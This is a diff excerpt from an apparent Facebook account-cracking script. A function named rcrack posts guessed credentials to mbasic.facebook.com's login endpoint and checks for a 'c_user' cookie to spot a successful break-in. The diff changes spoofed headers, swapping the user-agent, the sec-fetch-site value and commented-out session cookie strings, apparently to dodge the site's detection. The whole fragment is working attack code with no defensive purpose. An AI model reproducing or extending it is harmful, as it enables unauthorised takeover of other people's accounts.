@@ -235,16 +235,16 @@ def rcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-            # 'cookie': 'datr=HmbBYwb8ALDuIFvheXpmnbew; sb=HmbBY1CwLZLp21XjAWcBkgPb; dnonce=AWn-6tZiKSEAfh9CmpCmzm3akuIbmPIrMwCsrfg_q6HmljAOtnaBEOjFc3S2ttOtx0FvNkhPcEucccDw1cB9LSzZ; fr=0LdLmjCV4VEx52H2z..BjwWYg.x-.AAA.0.0.BjwWaW.AWU-xWREznk',
+            # 'cookie': 'datr=-9jDYzV_hqwfw3Fbn3TQULSv; sb=-9jDYzbc3N8QCJ7Se8GjSs2m; fr=0Tlv0YCrMlsnIicq9..Bjw9k5.bM.AAA.0.0.Bjw9lH.AWV5uOwr4gc',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
+            'sec-fetch-site': 'cross-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
